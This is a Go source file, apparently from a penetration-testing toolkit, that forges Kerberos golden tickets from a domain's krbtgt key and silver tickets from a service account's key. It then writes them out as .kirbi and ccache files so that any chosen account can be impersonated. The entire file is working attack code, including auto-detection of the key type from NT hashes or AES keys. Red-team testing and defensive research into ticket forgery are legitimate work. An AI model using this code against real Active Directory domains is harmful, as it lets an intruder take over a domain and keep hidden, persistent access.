package kerberos

import (
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	mtkrb "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
)

// ForgeResult describes a forged ticket and where it was written.
type ForgeResult struct {
	Kind       string // "golden" or "silver"
	Username   string
	SPN        string // silver only
	KirbiPath  string
	CCachePath string
}

// ForgeGolden forges a golden ticket (a TGT for krbtgt/REALM) signed with the
// domain krbtgt key, and writes it as a .kirbi and a ccache. realm is the AD DNS
// domain, domainSID the account-domain SID (S-1-5-21-...), user the impersonated
// account and rid its RID. keyHex is the krbtgt key (32 hex = RC4/NT hash, 64/32
// hex = AES). keyEType overrides the auto-detected encryption type when non-zero.
func ForgeGolden(realm, domainSID, user string, rid uint32, keyHex string, keyEType int, outBase string) (*ForgeResult, error) {
	opts, err := forgeOptions(realm, domainSID, user, rid, keyHex, keyEType)
	if err != nil {
		return nil, err
	}
	ft, err := mtkrb.ForgeGolden(opts)
	if err != nil {
		return nil, fmt.Errorf("forge golden: %w", err)
	}

	res := &ForgeResult{Kind: "golden", Username: user}
	if err := writeKirbi(ft, outBase+"_golden.kirbi", res); err != nil {
		return nil, err
	}

	// ccache: load the forged TGT into a client and export it.
	client := mtkrb.NewClient(user, realm, "")
	defer client.Destroy()
	kirbiBytes, err := ft.KirbiBytes()
	if err == nil {
		if err := client.LoadTGTFromKirbiBytes(kirbiBytes); err == nil {
			if cc, err := client.ExportTGTCCache(); err == nil {
				if data, err := cc.Marshal(); err == nil {
					path := outBase + "_golden.ccache"
					if os.WriteFile(path, data, 0o600) == nil {
						res.CCachePath = path
					}
				}
			}
		}
	}
	return res, nil
}

// ForgeSilver forges a silver ticket (a service ticket for spn) signed with that
// service account's key, and writes it as a .kirbi and a ccache. Parameters match
// ForgeGolden; keyHex is the service account's key.
func ForgeSilver(realm, domainSID, user string, rid uint32, keyHex string, keyEType int, spn, outBase string) (*ForgeResult, error) {
	opts, err := forgeOptions(realm, domainSID, user, rid, keyHex, keyEType)
	if err != nil {
		return nil, err
	}
	ft, err := mtkrb.ForgeSilver(opts, spn)
	if err != nil {
		return nil, fmt.Errorf("forge silver: %w", err)
	}

	res := &ForgeResult{Kind: "silver", Username: user, SPN: spn}
	if err := writeKirbi(ft, outBase+"_silver.kirbi", res); err != nil {
		return nil, err
	}

	client := mtkrb.NewClient(user, realm, "")
	defer client.Destroy()
	if err := client.LoadForgedServiceTicket(ft); err == nil {
		path := outBase + "_silver.ccache"
		if client.ExportServiceTicketCCacheToFile(spn, path) == nil {
			res.CCachePath = path
		}
	}
	return res, nil
}

// forgeOptions builds a ForgeOptions from the shared parameters, auto-detecting
// the key encryption type from the key length when keyEType is zero.
func forgeOptions(realm, domainSID, user string, rid uint32, keyHex string, keyEType int) (mtkrb.ForgeOptions, error) {
	key, err := hex.DecodeString(strings.TrimSpace(keyHex))
	if err != nil {
		return mtkrb.ForgeOptions{}, fmt.Errorf("invalid key (expect hex): %w", err)
	}
	if keyEType == 0 {
		switch len(key) {
		case 16:
			keyEType = 23 // RC4-HMAC (NT hash) — the common case; override with --forge-key-etype 17 for AES128
		case 32:
			keyEType = 18 // AES256-CTS-HMAC-SHA1-96
		default:
			return mtkrb.ForgeOptions{}, fmt.Errorf("key length %d not a recognised Kerberos key (want 16 or 32 bytes)", len(key))
		}
	}
	if domainSID == "" {
		return mtkrb.ForgeOptions{}, fmt.Errorf("domain SID required (auto-resolved from the session, or pass it)")
	}
	return mtkrb.ForgeOptions{
		Realm:     realm,
		Username:  user,
		DomainSID: domainSID,
		UserRID:   rid,
		Key:       key,
		KeyEType:  keyEType,
	}, nil
}

// writeKirbi serialises a forged ticket to path and records it in res.
func writeKirbi(ft *mtkrb.ForgedTicket, path string, res *ForgeResult) error {
	data, err := ft.KirbiBytes()
	if err != nil {
		return fmt.Errorf("serialise kirbi: %w", err)
	}
	if err := os.WriteFile(path, data, 0o600); err != nil {
		return fmt.Errorf("write %s: %w", path, err)
	}
	res.KirbiPath = path
	return nil
}
